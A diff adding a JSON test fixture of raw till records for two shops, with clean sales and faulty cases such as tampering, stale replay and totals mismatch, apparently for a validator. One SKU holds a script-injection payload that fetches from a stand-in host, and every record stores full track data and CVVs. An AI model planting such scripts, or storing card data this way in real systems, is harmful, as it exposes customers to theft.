@@ -1,0 +1,509 @@
+{
+  "about": "Raw till records as the store database holds them. Keys are fixture constants that protect nothing; card numbers are the networks' test numbers.",
+  "join_id_key": "fixture-join-key-demo-retail-pos-edge",
+  "register_key_seed": "fixture-register-seed-demo-retail-pos-edge",
+  "stores": [
+    "s1",
+    "s2"
+  ],
+  "heartbeats": {
+    "s1": {
+      "s1-r1": {
+        "state": "open",
+        "age_s": 0
+      },
+      "s1-r2": {
+        "state": "closed",
+        "age_s": 0
+      },
+      "s1-r3": {
+        "state": "open",
+        "age_s": -60
+      }
+    },
+    "s2": {
+      "s2-r1": {
+        "state": "open",
+        "age_s": 0
+      }
+    }
+  },
+  "climate_temp_c": {
+    "s1": 21.4
+  },
+  "cases": [
+    {
+      "id": "clean-hot-drinks",
+      "title": "A clean sale: two flat whites and a croissant",
+      "store": "s1",
+      "captured_at": 1791191703.5,
+      "record": {
+        "txn_id": "s1-r1-fixture-00001",
+        "register_id": "s1-r1",
+        "ts": "2026-10-05T09:15:02.000Z",
+        "pan": "4111111111111111",
+        "track2": "4111111111111111=2812101123456789",
+        "cvv": "123",
+        "expiry": "2812",
+        "cardholder": "BAKKER/A",
+        "card_brand": "visa",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "HD-01",
+            "qty": 2,
+            "unit_cents": 340
+          },
+          {
+            "sku": "BK-01",
+            "qty": 1,
+            "unit_cents": 210
+          }
+        ],
+        "total_cents": 890,
+        "currency": "EUR",
+        "note": "",
+        "loyalty_email": "ana.bakker@example.net",
+        "sig": "38b0fe133b457e03a4b13f28bf999911965e2c2ef568751b5bf481a70487c34d"
+      }
+    },
+    {
+      "id": "clean-cold-drinks",
+      "title": "A clean sale: iced latte and lemonade",
+      "store": "s1",
+      "captured_at": 1791191710.5,
+      "record": {
+        "txn_id": "s1-r2-fixture-00002",
+        "register_id": "s1-r2",
+        "ts": "2026-10-05T09:15:09.000Z",
+        "pan": "5555555555554444",
+        "track2": "5555555555554444=2906101123456789",
+        "cvv": "456",
+        "expiry": "2906",
+        "cardholder": "VISSER/B",
+        "card_brand": "mastercard",
+        "entry_mode": "chip",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "CD-01",
+            "qty": 1,
+            "unit_cents": 420
+          },
+          {
+            "sku": "CD-03",
+            "qty": 1,
+            "unit_cents": 280
+          }
+        ],
+        "total_cents": 700,
+        "currency": "EUR",
+        "note": "",
+        "sig": "fa02b8ef96c3693a92851c9507140d4cbd6e1463c056a1a7c21001e5e664ea1a"
+      }
+    },
+    {
+      "id": "clean-same-card-other-store",
+      "title": "The same card at another store, which has no climate sensor",
+      "store": "s2",
+      "captured_at": 1791191715.5,
+      "record": {
+        "txn_id": "s2-r1-fixture-00003",
+        "register_id": "s2-r1",
+        "ts": "2026-10-05T09:15:14.000Z",
+        "pan": "4111111111111111",
+        "track2": "4111111111111111=2812101123456789",
+        "cvv": "123",
+        "expiry": "2812",
+        "cardholder": "BAKKER/A",
+        "card_brand": "visa",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "SW-01",
+            "qty": 1,
+            "unit_cents": 590
+          },
+          {
+            "sku": "SN-02",
+            "qty": 1,
+            "unit_cents": 320
+          }
+        ],
+        "total_cents": 910,
+        "currency": "EUR",
+        "note": "",
+        "loyalty_email": "ana.bakker@example.net",
+        "sig": "8ed407526f92eba5112b509182963a20c970348a6ee86c6d5b085516c6adadde"
+      }
+    },
+    {
+      "id": "clean-three-lines",
+      "title": "A clean sale with three product lines",
+      "store": "s2",
+      "captured_at": 1791191722.5,
+      "record": {
+        "txn_id": "s2-r1-fixture-00004",
+        "register_id": "s2-r1",
+        "ts": "2026-10-05T09:15:21.000Z",
+        "pan": "378282246310005",
+        "track2": "378282246310005=3011101123456789",
+        "cvv": "7890",
+        "expiry": "3011",
+        "cardholder": "WEBER/C",
+        "card_brand": "amex",
+        "entry_mode": "swipe",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "IC-01",
+            "qty": 1,
+            "unit_cents": 450
+          },
+          {
+            "sku": "CD-02",
+            "qty": 1,
+            "unit_cents": 190
+          },
+          {
+            "sku": "SN-01",
+            "qty": 2,
+            "unit_cents": 160
+          }
+        ],
+        "total_cents": 960,
+        "currency": "EUR",
+        "note": "",
+        "sig": "1072c69e7da3fc3d006965ad949bfc0d0c6d9a29efeb796941f673b2c2662233"
+      }
+    },
+    {
+      "id": "clean-bakery",
+      "title": "A clean sale: a sourdough loaf",
+      "store": "s1",
+      "captured_at": 1791191731.5,
+      "record": {
+        "txn_id": "s1-r1-fixture-00005",
+        "register_id": "s1-r1",
+        "ts": "2026-10-05T09:15:30.000Z",
+        "pan": "378282246310005",
+        "track2": "378282246310005=3011101123456789",
+        "cvv": "7890",
+        "expiry": "3011",
+        "cardholder": "WEBER/C",
+        "card_brand": "amex",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "BK-02",
+            "qty": 1,
+            "unit_cents": 480
+          }
+        ],
+        "total_cents": 480,
+        "currency": "EUR",
+        "note": "",
+        "sig": "048fea25ae70f81ebce42ce035a5b1f41d0810f5ca436e2e6226faebcfc84f13"
+      }
+    },
+    {
+      "id": "clean-sandwiches",
+      "title": "A clean sale: two cheese sandwiches",
+      "store": "s2",
+      "captured_at": 1791191737.5,
+      "record": {
+        "txn_id": "s2-r1-fixture-00006",
+        "register_id": "s2-r1",
+        "ts": "2026-10-05T09:15:36.000Z",
+        "pan": "5555555555554444",
+        "track2": "5555555555554444=2906101123456789",
+        "cvv": "456",
+        "expiry": "2906",
+        "cardholder": "VISSER/B",
+        "card_brand": "mastercard",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "SW-02",
+            "qty": 2,
+            "unit_cents": 450
+          }
+        ],
+        "total_cents": 900,
+        "currency": "EUR",
+        "note": "",
+        "sig": "f718a9a6e2b47b927684cbea3d9735a454f7c2adbcc417caf898e16679a41e61"
+      }
+    },
+    {
+      "id": "tampered",
+      "title": "A price changed after the till signed it",
+      "store": "s1",
+      "captured_at": 1791191745.5,
+      "record": {
+        "txn_id": "s1-r1-fixture-00007",
+        "register_id": "s1-r1",
+        "ts": "2026-10-05T09:15:44.000Z",
+        "pan": "5555555555554444",
+        "track2": "5555555555554444=2906101123456789",
+        "cvv": "456",
+        "expiry": "2906",
+        "cardholder": "VISSER/B",
+        "card_brand": "mastercard",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "HD-02",
+            "qty": 1,
+            "unit_cents": 1
+          },
+          {
+            "sku": "BK-01",
+            "qty": 1,
+            "unit_cents": 210
+          }
+        ],
+        "total_cents": 211,
+        "currency": "EUR",
+        "note": "",
+        "sig": "e29232a0a81a53725f5d91008a72b93b5f213d163769e2b319202c906195f7e8"
+      }
+    },
+    {
+      "id": "card-number-in-note",
+      "title": "A signed swipe with the card number typed into its note",
+      "store": "s2",
+      "captured_at": 1791191752.5,
+      "record": {
+        "txn_id": "s2-r1-fixture-00008",
+        "register_id": "s2-r1",
+        "ts": "2026-10-05T09:15:51.000Z",
+        "pan": "4111111111111111",
+        "track2": "4111111111111111=2812101123456789",
+        "cvv": "123",
+        "expiry": "2812",
+        "cardholder": "BAKKER/A",
+        "card_brand": "visa",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "HD-03",
+            "qty": 1,
+            "unit_cents": 380
+          }
+        ],
+        "total_cents": 380,
+        "currency": "EUR",
+        "note": "card 4111 1111 1111 1111 declined once, retried",
+        "loyalty_email": "ana.bakker@example.net",
+        "sig": "79dbc06d829f87fa17d84e110b148115a6d16ebc2a171d95378a13aad344db69"
+      }
+    },
+    {
+      "id": "malformed",
+      "title": "A swipe with no card number and a quantity of \"two\"",
+      "store": "s1",
+      "captured_at": 1791191759.5,
+      "record": {
+        "txn_id": "s1-r3-fixture-00009",
+        "register_id": "s1-r3",
+        "ts": "2026-10-05T09:15:58.000Z",
+        "track2": "378282246310005=3011101123456789",
+        "cvv": "7890",
+        "expiry": "3011",
+        "cardholder": "WEBER/C",
+        "card_brand": "amex",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "SN-01",
+            "qty": "two",
+            "unit_cents": 160
+          }
+        ],
+        "total_cents": 160,
+        "currency": "EUR",
+        "note": "",
+        "sig": "6c9d1d05269f42ee6f267a10181cf9beda4ae18099d64fce82997441d4697b88"
+      }
+    },
+    {
+      "id": "injection",
+      "title": "A correctly signed swipe with a script in the SKU",
+      "store": "s2",
+      "captured_at": 1791191766.5,
+      "record": {
+        "txn_id": "s2-r1-fixture-00010",
+        "register_id": "s2-r1",
+        "ts": "2026-10-05T09:16:05.000Z",
+        "pan": "5555555555554444",
+        "track2": "5555555555554444=2906101123456789",
+        "cvv": "456",
+        "expiry": "2906",
+        "cardholder": "VISSER/B",
+        "card_brand": "mastercard",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "<script>fetch('//x.example/k')</script>",
+            "qty": 1,
+            "unit_cents": 160
+          }
+        ],
+        "total_cents": 160,
+        "currency": "EUR",
+        "note": "",
+        "sig": "bc7b21e7701dc52d8f4ed5d57b29ab352e5cff48a609bdc928de780860bb047c"
+      }
+    },
+    {
+      "id": "stale-replay",
+      "title": "A swipe captured 400 seconds after it was signed",
+      "store": "s1",
+      "captured_at": 1791192172.0,
+      "record": {
+        "txn_id": "s1-r2-fixture-00011",
+        "register_id": "s1-r2",
+        "ts": "2026-10-05T09:16:12.000Z",
+        "pan": "4111111111111111",
+        "track2": "4111111111111111=2812101123456789",
+        "cvv": "123",
+        "expiry": "2812",
+        "cardholder": "BAKKER/A",
+        "card_brand": "visa",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "CD-01",
+            "qty": 1,
+            "unit_cents": 420
+          }
+        ],
+        "total_cents": 420,
+        "currency": "EUR",
+        "note": "",
+        "loyalty_email": "ana.bakker@example.net",
+        "sig": "f6280793d1753f98eabd1d68513f4d2fb38cf8acdfdbca58045f9cc2fd227cd6"
+      }
+    },
+    {
+      "id": "unknown-register",
+      "title": "A swipe from a register that is not enrolled here",
+      "store": "s1",
+      "captured_at": 1791191780.5,
+      "record": {
+        "txn_id": "s1-r9-fixture-00012",
+        "register_id": "s1-r9",
+        "ts": "2026-10-05T09:16:19.000Z",
+        "pan": "5555555555554444",
+        "track2": "5555555555554444=2906101123456789",
+        "cvv": "456",
+        "expiry": "2906",
+        "cardholder": "VISSER/B",
+        "card_brand": "mastercard",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "HD-01",
+            "qty": 1,
+            "unit_cents": 340
+          }
+        ],
+        "total_cents": 340,
+        "currency": "EUR",
+        "note": "",
+        "sig": "fd2d464c1941945bd7cd091e3709514d6f9a11fcef353448f56f9b58bfd58140"
+      }
+    },
+    {
+      "id": "totals-mismatch",
+      "title": "Lines add to 550 cents; the receipt says 700",
+      "store": "s2",
+      "captured_at": 1791191787.5,
+      "record": {
+        "txn_id": "s2-r1-fixture-00013",
+        "register_id": "s2-r1",
+        "ts": "2026-10-05T09:16:26.000Z",
+        "pan": "378282246310005",
+        "track2": "378282246310005=3011101123456789",
+        "cvv": "7890",
+        "expiry": "3011",
+        "cardholder": "WEBER/C",
+        "card_brand": "amex",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "HD-01",
+            "qty": 1,
+            "unit_cents": 340
+          },
+          {
+            "sku": "BK-01",
+            "qty": 1,
+            "unit_cents": 210
+          }
+        ],
+        "total_cents": 700,
+        "currency": "EUR",
+        "note": "",
+        "sig": "ff8d42f6d2b98df95c2bb36ea5900138b2d256b7257155c1d35061567ef46ca7"
+      }
+    },
+    {
+      "id": "over-limit",
+      "title": "A signed total over the 5,000.00 limit",
+      "store": "s1",
+      "captured_at": 1791191794.5,
+      "record": {
+        "txn_id": "s1-r1-fixture-00014",
+        "register_id": "s1-r1",
+        "ts": "2026-10-05T09:16:33.000Z",
+        "pan": "4111111111111111",
+        "track2": "4111111111111111=2812101123456789",
+        "cvv": "123",
+        "expiry": "2812",
+        "cardholder": "BAKKER/A",
+        "card_brand": "visa",
+        "entry_mode": "contactless",
+        "auth_code": "A7K2QZ",
+        "cashier": "OP07",
+        "items": [
+          {
+            "sku": "BK-02",
+            "qty": 1,
+            "unit_cents": 600000
+          }
+        ],
+        "total_cents": 600000,
+        "currency": "EUR",
+        "note": "",
+        "loyalty_email": "ana.bakker@example.net",
+        "sig": "02f91ca93e4a000fb82f34abd5a7a0bbd536d326c62da6fe1edd5f90fafa66aa"
+      }
+    }
+  ]
+}
